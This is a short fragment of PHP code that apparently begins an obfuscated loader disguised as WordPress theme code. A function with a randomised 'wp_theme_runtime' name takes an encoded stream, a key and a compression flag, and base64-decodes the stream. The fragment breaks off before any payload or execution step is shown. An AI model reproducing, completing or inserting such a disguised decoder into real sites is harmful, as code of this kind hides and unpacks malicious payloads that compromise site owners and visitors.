if (!function_exists('wp_theme_runtime_6c1f35')) {
    function wp_theme_runtime_6c1f35($wp_stream, $wp_key, $is_zlib) {
        $wp_raw = base64_decode(str_replace(array("\r", "\n", ' '), '', $wp_stream));
        if ($wp_raw === false) return '';
